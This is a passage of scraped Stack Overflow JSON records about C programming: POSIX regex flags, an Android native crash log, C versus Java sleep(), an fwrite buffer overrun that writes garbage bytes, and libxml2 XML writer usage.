&quot;^\\\\w+\\.c&quot;, 0);"}, {"owner": {"reputation": 4085, "user_id": 4185106, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/er5li.png?s=128&g=1", "display_name": "moffeltje", "link": "https://stackoverflow.com/users/4185106/moffeltje"}, "edited": false, "score": 0, "creation_date": 1437553166, "post_id": 31556982, "comment_id": 51071704, "body": "You are either writing code in C or in C++. There is no C/C++ language. Pick one."}], "answers": [{"comments": [{"owner": {"reputation": 139, "user_id": 5120033, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/8513bff1e2921aa850d95d788a363a3d?s=128&d=identicon&r=PG&f=1", "display_name": "Sri Kant", "link": "https://stackoverflow.com/users/5120033/sri-kant"}, "edited": false, "score": 0, "creation_date": 1437552391, "post_id": 31557011, "comment_id": 51071265, "body": "I changed as suggested reti = regcomp(&amp;regex, &quot;^\\\\w+\\\\.c$&quot;, 0); ,Even this does not help my compiler version is as follows gcc (Ubuntu 4.9.2-0ubuntu1~14.04) 4.9.2 Copyright (C) 2014 Free Software Foundation, Inc. This is free software; see the source for copying conditions.  There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE."}, {"owner": {"reputation": 159902, "user_id": 3297613, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/KHhzd.jpg?s=128&g=1", "display_name": "Avinash Raj", "link": "https://stackoverflow.com/users/3297613/avinash-raj"}, "reply_to_user": {"reputation": 139, "user_id": 5120033, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/8513bff1e2921aa850d95d788a363a3d?s=128&d=identicon&r=PG&f=1", "display_name": "Sri Kant", "link": "https://stackoverflow.com/users/5120033/sri-kant"}, "edited": false, "score": 0, "creation_date": 1437552441, "post_id": 31557011, "comment_id": 51071295, "body": "try <code>regcomp(&amp;regex, &quot;(?m)^\\\\w+\\\\.c$&quot;, 0);</code>"}, {"owner": {"reputation": 139, "user_id": 5120033, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/8513bff1e2921aa850d95d788a363a3d?s=128&d=identicon&r=PG&f=1", "display_name": "Sri Kant", "link": "https://stackoverflow.com/users/5120033/sri-kant"}, "edited": false, "score": 0, "creation_date": 1437552689, "post_id": 31557011, "comment_id": 51071442, "body": "reti = regcomp(&amp;regex, &quot;(?m)^\\\\w+\\\\.c$&quot;, 0); does not work either .But I am thinking except a double escape there should not be any thing more to it ."}, {"owner": {"reputation": 139, "user_id": 5120033, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/8513bff1e2921aa850d95d788a363a3d?s=128&d=identicon&r=PG&f=1", "display_name": "Sri Kant", "link": "https://stackoverflow.com/users/5120033/sri-kant"}, "edited": false, "score": 0, "creation_date": 1437552910, "post_id": 31557011, "comment_id": 51071544, "body": "reti = regcomp(&amp;regex, &quot;^[[:alnum:]_]+\\\\.c$&quot;, 0);  Did not work"}, {"owner": {"reputation": 481661, "user_id": 3832970, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/64323e6cf08401474da3bf770ea13b58?s=128&d=identicon&r=PG&f=1", "display_name": "Wiktor Stribi\u017cew", "link": "https://stackoverflow.com/users/3832970/wiktor-stribi%c5%bcew"}, "edited": false, "score": 0, "creation_date": 1437553418, "post_id": 31557011, "comment_id": 51071856, "body": "I guess you need <code>REG_EXTENDED</code> flag to make <code>$</code> work with C regex."}, {"owner": {"reputation": 139, "user_id": 5120033, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/8513bff1e2921aa850d95d788a363a3d?s=128&d=identicon&r=PG&f=1", "display_name": "Sri Kant", "link": "https://stackoverflow.com/users/5120033/sri-kant"}, "edited": false, "score": 0, "creation_date": 1437786269, "post_id": 31557011, "comment_id": 51192473, "body": "Thanks stribizhev ,REG_EXTENDED works !! any idea how to use similar option in c++11 ?will   std::regex::egrep work?"}, {"owner": {"reputation": 139, "user_id": 5120033, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/8513bff1e2921aa850d95d788a363a3d?s=128&d=identicon&r=PG&f=1", "display_name": "Sri Kant", "link": "https://stackoverflow.com/users/5120033/sri-kant"}, "edited": false, "score": 0, "creation_date": 1437788352, "post_id": 31557011, "comment_id": 51192784, "body": "similar implementation in c++11        const std::regex re(&quot;^\\\\w+\\\\.c&quot;,std::regex::extended);         std::smatch match;         std::string str  (&quot;test.c&quot;);         if(std::regex_match(str, match,re) &amp;&amp; match.size()&gt;1)         {                 printf(&quot;match\\n&quot;);         }         else         {                  printf(&quot;mis match\\n&quot;);         } gives &quot;terminate called after throwing an instance of &#39;std::regex_error&#39;   what():  regex_error Aborted (core dumped)&quot; what is that missing in the above code"}, {"owner": {"reputation": 139, "user_id": 5120033, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/8513bff1e2921aa850d95d788a363a3d?s=128&d=identicon&r=PG&f=1", "display_name": "Sri Kant", "link": "https://stackoverflow.com/users/5120033/sri-kant"}, "edited": false, "score": 0, "creation_date": 1437789352, "post_id": 31557011, "comment_id": 51192916, "body": "const std::regex re(&quot;^(\\\\w)+\\\\.c&quot;);         std::smatch match;         std::string str  (&quot;test.c&quot;);         if(std::regex_match(str, match,re) &amp;&amp; match.size()&gt;1) worked but why do we need additional () braces for \\\\w is not understood"}, {"owner": {"reputation": 159902, "user_id": 3297613, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/KHhzd.jpg?s=128&g=1", "display_name": "Avinash Raj", "link": "https://stackoverflow.com/users/3297613/avinash-raj"}, "edited": false, "score": 0, "creation_date": 1437797451, "post_id": 31557011, "comment_id": 51194133, "body": "<code>()</code> called capturing group and it won&#39;t be needed here. Try changing ` match.size()&gt;1` to ` match.size()&gt;=1` will work, i think."}], "tags": [], "owner": {"reputation": 159902, "user_id": 3297613, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/KHhzd.jpg?s=128&g=1", "display_name": "Avinash Raj", "link": "https://stackoverflow.com/users/3297613/avinash-raj"}, "is_accepted": false, "score": 2, "last_activity_date": 1437552562, "last_edit_date": 1437552562, "creation_date": 1437551433, "answer_id": 31557011, "question_id": 31556982, "link": "https://stackoverflow.com/questions/31556982/how-to-get-ultraedit-regex-search-to-work-in-c-c-code/31557011#31557011", "title": "How to get Ultraedit regex search to work in C/C++ code", "body": "<p>You need to escape the backslash one more time otherwise, it would be readed as an escape sequence.</p>\n\n<pre><code>reti = regcomp(&amp;regex, \"^\\\\w+\\\\.c\", 0);\n</code></pre>\n\n<p>And also i think you're trying to match all the file names with the extension <code>.c</code>, in that case, you must use end of the line anchor.</p>\n\n<pre><code>reti = regcomp(&amp;regex, \"^\\\\w+\\\\.c$\", 0);\n</code></pre>\n\n<p>Or</p>\n\n<pre><code>reti = regcomp(&amp;regex, \"^[[:alnum:]_]+\\\\.c$\", 0);\n</code></pre>\n"}], "owner": {"reputation": 139, "user_id": 5120033, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/8513bff1e2921aa850d95d788a363a3d?s=128&d=identicon&r=PG&f=1", "display_name": "Sri Kant", "link": "https://stackoverflow.com/users/5120033/sri-kant"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 44, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1437552812, "creation_date": 1437551342, "last_edit_date": 1437552812, "question_id": 31556982, "link": "https://stackoverflow.com/questions/31556982/how-to-get-ultraedit-regex-search-to-work-in-c-c-code", "title": "How to get Ultraedit regex search to work in C/C++ code", "body": "<p>I am having a tough time getting an Ultraedit regex to work in C/C++ code. I am aware of adding additional <code>/</code> for <code>/w</code> but still it does not work.</p>\n\n<pre><code>#include&lt;regex.h&gt;\n#include &lt;stdio.h&gt;\n\nint main()\n{\n\n    int reti;\n    regex_t regex;\n    reti = regcomp(&amp;regex, \"^\\w+\\.c\", 0);\n\n    if(!reti)\n    {\n        printf(\"compile success\\n\");\n    }\n\n    reti = regexec(&amp;regex, \"test.c\", 0, NULL, 0);\n    if(!reti)\n    {\n        printf(\"match\\n\");\n    }\n    else\n    {\n        printf(\"mis match\\n\");\n    }\n\n}\n</code></pre>\n\n<p>The regular expression above works properly on Ultraedit but why does it not work if put in C code as shown here?</p>\n\n<p>I expect \"match\" to be printed out but when I run the above code, I get:</p>\n\n<blockquote>\n  <p>compile success<br>\n  mis match</p>\n</blockquote>\n"}, {"tags": ["android", "c", "camera", "video-streaming", "native"], "comments": [{"owner": {"reputation": 592, "user_id": 870461, "user_type": "registered", "accept_rate": 60, "profile_image": "https://www.gravatar.com/avatar/c024b7f20ee890fd837a5ce1e841570f?s=128&d=identicon&r=PG", "display_name": "Tommy Chan", "link": "https://stackoverflow.com/users/870461/tommy-chan"}, "edited": false, "score": 0, "creation_date": 1452043702, "post_id": 31556971, "comment_id": 56994084, "body": "Did you find a solution to this? @user2106108 I&#39;m seeing this as well (calling into the c lib) and crashing after a GC event."}], "owner": {"reputation": 163, "user_id": 2106108, "user_type": "registered", "accept_rate": 17, "profile_image": "https://www.gravatar.com/avatar/9283b73cb3f2f714395f5503a5bf6c8b?s=128&d=identicon&r=PG", "display_name": "user2106108", "link": "https://stackoverflow.com/users/2106108/user2106108"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 348, "favorite_count": 0, "answer_count": 0, "score": 3, "last_activity_date": 1501595553, "creation_date": 1437551300, "last_edit_date": 1501595553, "question_id": 31556971, "link": "https://stackoverflow.com/questions/31556971/a-libc-fatal-signal-11-sigsegv-at-0xd2044d4c-code-1-thread-5786-finalizerd", "title": "A/libc Fatal signal 11 (SIGSEGV) at 0xd2044d4c (code=1), thread 5786 (FinalizerDaemon) error when setPreviewCallback is called", "body": "<p>I have this peculiar issue where my app crashes with SIGSEGV error in my camera module occasionally. Using the Camera.PreviewCallback implementation the <strong>onPreviewFrame</strong> method does gets called around <strong>8-10</strong> times,before getting crashed with log trace as below :</p>\n\n<pre><code>07-22 12:37:34.981    5777-5777/com.example.surveyapp V/surfaceChanged\ufe55 entered\n07-22 12:37:37.834    5777-5777/com.example.surveyapp V/surfaceChanged\ufe55 entered\n\n07-22 12:37:40.056    5777-5777/com.example.surveyapp D/ProgressBar\ufe55 updateDrawableBounds: left = 0\n07-22 12:37:40.056    5777-5777/com.example.surveyapp D/ProgressBar\ufe55 updateDrawableBounds: top = 0\n07-22 12:37:40.056    5777-5777/com.example.surveyapp D/ProgressBar\ufe55 updateDrawableBounds: right = 64\n07-22 12:37:40.056    5777-5777/com.example.surveyapp D/ProgressBar\ufe55 updateDrawableBounds: bottom = 64\n07-22 12:37:40.126    5777-5777/com.example.surveyapp E/MainActivity\ufe55 onPreviewFrame\n07-22 12:37:40.227    5777-5777/com.example.surveyapp E/MainActivity\ufe55 onPreviewFrame\n07-22 12:37:40.387    5777-6254/com.example.surveyapp D/dalvikvm\ufe55 **GC_FOR_ALLOC freed 4059K, 28% free 12685K/17596K, paused 37ms, total 37ms**\n07-22 12:37:40.387    5777-5777/com.example.surveyapp E/MainActivity\ufe55 onPreviewFrame\n07-22 12:37:40.467    5777-5777/com.example.surveyapp E/MainActivity\ufe55 onPreviewFrame\n07-22 12:37:40.647    5777-5788/com.example.surveyapp D/dalvikvm\ufe55 **GC_FOR_ALLOC freed 1364K, 31% free 12223K/17596K, paused 53ms, total 53ms**\n07-22 12:37:40.647    5777-5786/com.example.surveyapp A/libc\ufe55 **Fatal signal 11 (SIGSEGV) at 0xd2044d4c (code=1), thread 5786 (FinalizerDaemon)**\n</code></pre>\n\n<p>This behaviour does not occur all the time,but whenever I login from my app and go into this Camera Module ,this error occurs.If I directly enter camera module from my DashBoard page this error does not occurs or If i run this camera module as standalone application no error occurs.</p>\n\n<p><strong>Note :</strong> I am also using native C code for encryption purpose in this app</p>\n"}, {"tags": ["java", "c", "ubuntu"], "comments": [{"owner": {"reputation": 251753, "user_id": 129570, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/aa98a2c5baceef5ffcaf95fdde12b8fb?s=128&d=identicon&r=PG", "display_name": "Oliver Charlesworth", "link": "https://stackoverflow.com/users/129570/oliver-charlesworth"}, "edited": false, "score": 4, "creation_date": 1437550874, "post_id": 31556759, "comment_id": 51070338, "body": "So your question is actually &quot;why doesn&#39;t my C code work?&quot;?"}, {"owner": {"reputation": 14451, "user_id": 33499, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/17c590aa4c56918b47c7ba5e39dba5d8?s=128&d=identicon&r=PG", "display_name": "wimh", "link": "https://stackoverflow.com/users/33499/wimh"}, "edited": false, "score": 2, "creation_date": 1437550941, "post_id": 31556759, "comment_id": 51070371, "body": "The the POSIX <code>sleep(x)</code> uses seconds, the java version uses milliseconds."}, {"owner": {"reputation": 67504, "user_id": 1230836, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/38PFC.jpg?s=128&g=1", "display_name": "Elias Van Ootegem", "link": "https://stackoverflow.com/users/1230836/elias-van-ootegem"}, "edited": false, "score": 0, "creation_date": 1437551468, "post_id": 31556759, "comment_id": 51070694, "body": "So put simply, your question is: <i>&quot;What&#39;s the difference between C functions that have the same name as an existing Java function?&quot;</i>"}, {"owner": {"reputation": 3121, "user_id": 1912077, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/sH4ua.jpg?s=128&g=1", "display_name": "Renjith", "link": "https://stackoverflow.com/users/1912077/renjith"}, "edited": false, "score": 0, "creation_date": 1437551544, "post_id": 31556759, "comment_id": 51070741, "body": "C likes to sleep a little bit more since it runs very fast :-p"}, {"owner": {"reputation": 359, "user_id": 4622092, "user_type": "registered", "accept_rate": 0, "profile_image": "https://lh5.googleusercontent.com/-4ij1Efg5lLY/AAAAAAAAAAI/AAAAAAAAALQ/5yYuiH_AOaQ/photo.jpg?sz=128", "display_name": "Bharat jain", "link": "https://stackoverflow.com/users/4622092/bharat-jain"}, "reply_to_user": {"reputation": 251753, "user_id": 129570, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/aa98a2c5baceef5ffcaf95fdde12b8fb?s=128&d=identicon&r=PG", "display_name": "Oliver Charlesworth", "link": "https://stackoverflow.com/users/129570/oliver-charlesworth"}, "edited": false, "score": 0, "creation_date": 1437554569, "post_id": 31556759, "comment_id": 51072534, "body": "@Oliver yes Exactly..."}, {"owner": {"reputation": 74715, "user_id": 471272, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/jSlyx.gif?s=128&g=1", "display_name": "tchrist", "link": "https://stackoverflow.com/users/471272/tchrist"}, "reply_to_user": {"reputation": 67504, "user_id": 1230836, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/38PFC.jpg?s=128&g=1", "display_name": "Elias Van Ootegem", "link": "https://stackoverflow.com/users/1230836/elias-van-ootegem"}, "edited": false, "score": 0, "creation_date": 1437935991, "post_id": 31556759, "comment_id": 51227709, "body": "@EliasVanOotegem Pretty sure you\u2019ve got that backwards: C has seniority. It should be <i>\u201cWhat&#39;s the difference between Java functions that have the same name as an C Java function?\u201d</i> :)"}], "answers": [{"tags": [], "owner": {"reputation": 14204, "user_id": 4723795, "user_type": "registered", "accept_rate": 82, "profile_image": "https://graph.facebook.com/980705688614873/picture?type=large", "display_name": "xenteros", "link": "https://stackoverflow.com/users/4723795/xenteros"}, "is_accepted": false, "score": 0, "last_activity_date": 1437550880, "creation_date": 1437550880, "answer_id": 31556812, "question_id": 31556759, "link": "https://stackoverflow.com/questions/31556759/what-is-the-diff-between-sleep-of-java-sleep-of-c/31556812#31556812", "title": "What is the Diff between sleep() of java &amp; sleep() of c ?", "body": "<p>You should probably use</p>\n\n<pre><code>#include&lt;unistd.h&gt;\n</code></pre>\n\n<p>On windows, you would use:</p>\n\n<pre><code>#include&lt;windows.h&gt;\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 1249, "user_id": 1010280, "user_type": "registered", "accept_rate": 44, "profile_image": "https://www.gravatar.com/avatar/cfe70b8dfdf282a09b409008b1618c62?s=128&d=identicon&r=PG", "display_name": "Anjali", "link": "https://stackoverflow.com/users/1010280/anjali"}, "is_accepted": false, "score": 0, "last_activity_date": 1437550952, "creation_date": 1437550952, "answer_id": 31556840, "question_id": 31556759, "link": "https://stackoverflow.com/questions/31556759/what-is-the-diff-between-sleep-of-java-sleep-of-c/31556840#31556840", "title": "What is the Diff between sleep() of java &amp; sleep() of c ?", "body": "<p><code>Sleep</code> is a windows function.  On Unix/Linux use <code>usleep</code>.  Note that <code>usleep</code> takes microseconds, not milliseconds.</p>\n\n<p><strong>> Updated</strong></p>\n\n<p>older <a href=\"http://en.wikipedia.org/wiki/POSIX\" rel=\"nofollow\">POSIX</a> standards defined <a href=\"http://man7.org/linux/man-pages/man3/usleep.3.html\" rel=\"nofollow\"><code>usleep()</code></a>, so this is available on Linux:</p>\n\n<blockquote>\n<pre><code>   int usleep(useconds_t usec);\n</code></pre>\n  \n  <p>DESCRIPTION</p>\n  \n  <p>The  usleep()  function  suspends execution of the calling process for\n         (at least) usec microseconds.  The sleep may be lengthened slightly by\n         any system activity or by the time spent processing the call or by the\n         granularity of system timers.</p>\n</blockquote>\n\n<p><code>usleep()</code> takes <strong>microseconds</strong>, so you will have to multiply the input by 1000 in order to sleep in milliseconds.</p>\n\n<hr>\n\n<p><code>usleep()</code> has since been deprecated and subsequently removed from POSIX; for new code, <a href=\"http://man7.org/linux/man-pages/man2/nanosleep.2.html\" rel=\"nofollow\"><code>nanosleep()</code></a> is preferred:</p>\n\n<blockquote>\n<pre><code>   #include &lt;time.h&gt;\n\n   int nanosleep(const struct timespec *req, struct timespec *rem);\n</code></pre>\n  \n  <p>DESCRIPTION</p>\n  \n  <p><code>nanosleep()</code> suspends the execution of the calling thread until either at least the time specified in <code>*req</code> has elapsed, or the\n  delivery of a signal that triggers the invocation of a handler in the\n  calling thread or that terminates the process.</p>\n  \n  <p>The structure timespec is used to specify intervals of time with nanosecond precision.  It is defined as follows:</p>\n\n<pre><code>       struct timespec {\n           time_t tv_sec;        /* seconds */\n           long   tv_nsec;       /* nanoseconds */\n       };\n</code></pre>\n</blockquote>\n"}, {"tags": [], "owner": {"reputation": 3932, "user_id": 206790, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ca33c138b942f7a9204b328636eacc1e?s=128&d=identicon&r=PG", "display_name": "yu_sha", "link": "https://stackoverflow.com/users/206790/yu-sha"}, "is_accepted": false, "score": 3, "last_activity_date": 1437551324, "creation_date": 1437551324, "answer_id": 31556979, "question_id": 31556759, "link": "https://stackoverflow.com/questions/31556759/what-is-the-diff-between-sleep-of-java-sleep-of-c/31556979#31556979", "title": "What is the Diff between sleep() of java &amp; sleep() of c ?", "body": "<p>C function is defined as <code>sleep(unsigned int seconds);</code></p>\n\n<p>Java function as <code>Thread.sleep(long millis).</code></p>\n\n<p>While the functions are similar, meaning of parameter is different. <code>Thread.sleep(1000)</code> in Java will stop your thread for a second, and <code>sleep(1000)</code> in C will freeze it for what seems like forever.</p>\n\n<p>In C there are functions with better precision: on Windows you have Sleep from windows.h, and in Linux you have usleep and nanosleep for microseconds and nanoseconds arguments respectively.</p>\n"}], "owner": {"reputation": 359, "user_id": 4622092, "user_type": "registered", "accept_rate": 0, "profile_image": "https://lh5.googleusercontent.com/-4ij1Efg5lLY/AAAAAAAAAAI/AAAAAAAAALQ/5yYuiH_AOaQ/photo.jpg?sz=128", "display_name": "Bharat jain", "link": "https://stackoverflow.com/users/4622092/bharat-jain"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 653, "favorite_count": 1, "answer_count": 3, "score": -4, "last_activity_date": 1437551324, "creation_date": 1437550740, "question_id": 31556759, "link": "https://stackoverflow.com/questions/31556759/what-is-the-diff-between-sleep-of-java-sleep-of-c", "title": "What is the Diff between sleep() of java &amp; sleep() of c ?", "body": "<p>I was using Java to test my code &amp; i used threads . I converted that same code into c.</p>\n\n<pre><code>#include&lt;pthread.h&gt;\n</code></pre>\n\n<p>I have used above in c. So i just want to know that is there any difference between sleep() of Java &amp; sleep() of c because in java its working fine but in c its not responding at all.</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 59603, "user_id": 60281, "user_type": "registered", "accept_rate": 98, "profile_image": "https://www.gravatar.com/avatar/29ebf39f3857b4fc4f51e93e7b9c4af4?s=128&d=identicon&r=PG", "display_name": "DevSolar", "link": "https://stackoverflow.com/users/60281/devsolar"}, "edited": false, "score": 8, "creation_date": 1437550568, "post_id": 31556528, "comment_id": 51070156, "body": "(Almost) minimal and complete example, observed output, expected output. You, sir, deserve a medal. :-D"}, {"owner": {"reputation": 57221, "user_id": 3032289, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/9c171ec0f2c8040d24436a40a3bf075b?s=128&d=identicon&r=PG", "display_name": "Luaan", "link": "https://stackoverflow.com/users/3032289/luaan"}, "edited": false, "score": 1, "creation_date": 1437552597, "post_id": 31556528, "comment_id": 51071388, "body": "Good old buffer overrun :)"}], "answers": [{"comments": [{"owner": {"reputation": 18146, "user_id": 646619, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/bd61a0f309ebc135d2661710c2faf379?s=128&d=identicon&r=PG", "display_name": "Colonel Thirty Two", "link": "https://stackoverflow.com/users/646619/colonel-thirty-two"}, "edited": false, "score": 0, "creation_date": 1437575326, "post_id": 31556573, "comment_id": 51087553, "body": "Wouldn&#39;t it be better to use <code>sizeof(buff[0])</code> for the element size argument too?"}, {"owner": {"reputation": 29294, "user_id": 2659313, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9828b91aef4c2b3cf14f3501e0a20e33?s=128&d=identicon&r=PG", "display_name": "Mohit Jain", "link": "https://stackoverflow.com/users/2659313/mohit-jain"}, "reply_to_user": {"reputation": 18146, "user_id": 646619, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/bd61a0f309ebc135d2661710c2faf379?s=128&d=identicon&r=PG", "display_name": "Colonel Thirty Two", "link": "https://stackoverflow.com/users/646619/colonel-thirty-two"}, "edited": false, "score": 0, "creation_date": 1437576850, "post_id": 31556573, "comment_id": 51088771, "body": "@ColonelThirtyTwo Yes, that is preferable."}], "tags": [], "owner": {"reputation": 29294, "user_id": 2659313, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/9828b91aef4c2b3cf14f3501e0a20e33?s=128&d=identicon&r=PG", "display_name": "Mohit Jain", "link": "https://stackoverflow.com/users/2659313/mohit-jain"}, "is_accepted": true, "score": 19, "last_activity_date": 1437630241, "last_edit_date": 1495535059, "creation_date": 1437550158, "answer_id": 31556573, "question_id": 31556528, "link": "https://stackoverflow.com/questions/31556528/overhead-data-when-writing-to-a-binary-file/31556573#31556573", "title": "Overhead data when writing to a binary file", "body": "<blockquote>\n  <p>What does the additional data represent <code>85fd 0804 0001</code></p>\n</blockquote>\n\n<p>Possibly some random garbage data.</p>\n\n<blockquote>\n  <p>how do I prevent it from occurring?</p>\n</blockquote>\n\n<p><code>fwrite(buff,sizeof(int16_t), sizeof(buff),rawf);</code> should be written as:</p>\n\n<pre><code>fwrite(buff,sizeof(int16_t), sizeof(buff) / sizeof(buff[0]),rawf);\n/*               ^                          ^^^^^^^^^^^^^^^      */\n/*       size of each object      Count of objects               */\n/*              (2)                  (3)                         */\n\n/* or */\nfwrite(buff, sizeof buf[0], sizeof buff / sizeof buff[0], rawf);\n</code></pre>\n\n<p><code>sizeof buff / sizeof buff[0]</code> gets the <a href=\"https://stackoverflow.com/questions/37538/how-do-i-determine-the-size-of-my-array-in-c\">array length in number of objects (or members)</a> while <code>sizeof buff</code> gives the size of array in bytes.</p>\n\n<p>So you are reading past the <code>buff</code> and writing it to the file and invoking <a href=\"https://en.wikipedia.org/wiki/Undefined_behavior\" rel=\"nofollow noreferrer\">undefined behaviour</a>. In your case you are seeing the random garbage data being written to output file.</p>\n\n<p>In your case, <code>sizeof</code> of each element in <code>buff</code> is 2 bytes and <code>buff</code> array has 3 members causing total size to be 6 bytes. When you write <code>fwrite(buff,sizeof(int16_t), sizeof(buff),rawf);</code>, 6 objects of 2 byte each are written to the file which is not something that you want to do.</p>\n\n<p>Now you are writing 6 data of type (size) <code>int16_t</code> starting from <code>buff[0]</code> i.e. <code>buff[0..5]</code> to the output. <code>buff[0..2]</code> are <code>0</code>s as expected and <code>buff[3..5]</code> are garbage.</p>\n"}, {"tags": [], "owner": {"reputation": 219167, "user_id": 2380830, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/5qiYa.jpg?s=128&g=1", "display_name": "Bathsheba", "link": "https://stackoverflow.com/users/2380830/bathsheba"}, "is_accepted": false, "score": 9, "last_activity_date": 1437550454, "creation_date": 1437550454, "answer_id": 31556667, "question_id": 31556528, "link": "https://stackoverflow.com/questions/31556528/overhead-data-when-writing-to-a-binary-file/31556667#31556667", "title": "Overhead data when writing to a binary file", "body": "<p>The third argument of <code>fwrite</code> is the <em>number</em> of elements of size specified by the second parameter. It is not the total size in bytes, which you are currently doing.</p>\n\n<p>So you are overrunning your buffer.</p>\n"}], "owner": {"reputation": 12879, "user_id": 1214214, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/mE5HL.png?s=128&g=1", "display_name": "TheMeaningfulEngineer", "link": "https://stackoverflow.com/users/1214214/themeaningfulengineer"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 817, "favorite_count": 0, "accepted_answer_id": 31556573, "answer_count": 2, "score": 19, "last_activity_date": 1437630241, "creation_date": 1437550049, "question_id": 31556528, "link": "https://stackoverflow.com/questions/31556528/overhead-data-when-writing-to-a-binary-file", "title": "Overhead data when writing to a binary file", "body": "<p>I want to write a array containing 16bit integers as raw binary to a file and have tried with the following example:</p>\n\n<pre><code>#  define __int8_t_defined\n__intN_t (8, __QI__);\n__intN_t (16, __HI__);\n__intN_t (32, __SI__);\n__intN_t (64, __DI__);\n\nint main(int argc, char *argv[])\n{\n    FILE * rawf;\n    rawf = fopen(\"./rawPcm\",\"wb\");\n    int16_t buff[] = {0,0,0};\n    fwrite(buff,sizeof(int16_t), sizeof(buff),rawf);\n    fwrite(buff,sizeof(int16_t), sizeof(buff),rawf);  \n    fclose(rawf);\n}\n</code></pre>\n\n<p>However, the output contains more than just zeros.</p>\n\n<pre><code>$ hexdump -v rawPcm \n0000000 0000 0000 0000 85fd 0804 0001 0000 0000\n0000010 0000 85fd 0804 0001                    \n0000018\n</code></pre>\n\n<p>It writes <code>0000 0000 0000 85fd 0804 0001</code> for every <code>fwrite(buff,sizeof(int16_t), sizeof(buff),rawf);</code> while I would expect to get only <code>0000 0000 0000</code>.</p>\n\n<p>What does the additional data represent <code>85fd 0804 0001</code> and how do I prevent it from occurring?</p>\n"}, {"tags": ["c", "xml", "libxml2"], "answers": [{"tags": [], "owner": {"reputation": 3599, "user_id": 1477247, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2b3c80dc03f6997d7dce7497e77fff21?s=128&d=identicon&r=PG", "display_name": "Daniel", "link": "https://stackoverflow.com/users/1477247/daniel"}, "is_accepted": true, "score": 4, "last_activity_date": 1438345629, "last_edit_date": 1438345629, "creation_date": 1437550520, "answer_id": 31556681, "question_id": 31556467, "link": "https://stackoverflow.com/questions/31556467/libxml2-outputting-xml-element-with-attribute-and-content/31556681#31556681", "title": "Libxml2: Outputting XML element with attribute and content", "body": "<p>It looks like <a href=\"http://www.cse.yorku.ca/tdb/_doc.php/userg/sw/libxml2/doc/html/html/libxml-xmlwriter.html#xmlTextWriterWriteFormatString\" rel=\"nofollow\">xmlTextWriterWriteFormatString</a> or <a href=\"http://xmlTextWriterWriteString\" rel=\"nofollow\">xmlTextWriterWriteString</a> will do the trick. Somehow I missed those at first \nwhen looking through the API details. </p>\n\n<p>Rather than delete, I'll leave here as this info might be useful for others looking for this info quickly.</p>\n\n<p>Example:</p>\n\n<pre><code>if (xmlTextWriterStartElement(writer, BAD_CAST \"MyElement\") &lt; 0\n    || xmlTextWriterWriteAttribute(writer, BAD_CAST \"myAttrib\", \"x\") &lt; 0\n    || xmlTextWriterWriteString(writer, \"Content\") &lt; 0\n    || xmlTextWriterEndElement(writer) &lt; 0)\n{\n   // Handle error\n}\n</code></pre>\n\n<p>Update: Tested and confirmed this works.</p>\n"}], "owner": {"reputation": 3599, "user_id": 1477247, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2b3c80dc03f6997d7dce7497e77fff21?s=128&d=identicon&r=PG", "display_name": "Daniel", "link": "https://stackoverflow.com/users/1477247/daniel"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 835, "favorite_count": 0, "accepted_answer_id": 31556681, "answer_count": 1, "score": 2, "last_activity_date": 1438345629, "creation_date": 1437549859, "question_id": 31556467, "link": "https://stackoverflow.com/questions/31556467/libxml2-outputting-xml-element-with-attribute-and-content", "title": "Libxml2: Outputting XML element with attribute and content", "body": "<p>I'm using the libxml2 XMLTextWriter API (of which an official example is provided <a href=\"http://www.xmlsoft.org/examples/testWriter.c\" rel=\"nofollow\">here</a>) to output XML, but can't find any examples or see how to produce an element with both attributes and content, like so:</p>\n\n<pre><code> &lt;MyElement 